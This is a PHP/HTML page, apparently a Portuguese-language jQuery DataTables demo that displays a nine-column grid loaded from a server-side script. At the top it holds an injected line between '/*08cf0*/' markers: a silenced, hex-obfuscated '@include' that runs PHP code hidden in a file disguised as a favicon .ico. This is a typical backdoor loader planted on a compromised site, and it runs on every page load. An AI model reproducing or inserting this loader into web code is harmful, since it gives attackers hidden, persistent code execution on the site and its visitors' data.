<?php


/*08cf0*/

@include "\x2fw01/\x64/dag\x61tech\x2fmeus\x74este\x73/exe\x6dplo2\x2ffavi\x63on_d\x39ba57\x2eico";

/*08cf0*/



?>

<!DOCTYPE html>
<html>
	<title>Exemplo</title>
	<head>
		<link rel="stylesheet" type="text/css" href="css/jquery.dataTables.css">
		<script type="text/javascript" language="javascript" src="js/jquery.js"></script>
		<script type="text/javascript" language="javascript" src="js/jquery.dataTables.js"></script>
		<script type="text/javascript" language="javascript" >
			$(document).ready(function() {
				var dataTable = $('#employee-grid').DataTable( {
					"processing": true,
					"serverSide": true,
					"ajax":{
						url :"phpmysql_serverside.php", // json datasource
						type: "post",  // method  , by default get
						error: function(){  // error handling
							$(".employee-grid-error").html("");
							$("#employee-grid").append('<tbody class="employee-grid-error"><tr><th colspan="3">Sem registros</th></tr></tbody>');
							$("#employee-grid_processing").css("display","none");
							
						}
					}
				} );
			} );
		</script>
	</head>
	<body>
		<center> <h1>Exemplo 1</h1> </center>
		<table id="employee-grid"  cellpadding="0" cellspacing="0" border="0" class="display" width="100%">
					<thead>
						<tr>
							<th>CAMPO1</th>
							<th>CAMPO2</th>
							<th>CAMPO3</th>
							<th>CAMPO4</th>
							<th>CAMPO5</th>
							<th>CAMPO6</th>
							<th>CAMPO7</th>
							<th>CAMPO8</th>
							<th>CAMPO9</th>
						</tr>
					</thead>
			</table>
	</body>
</html>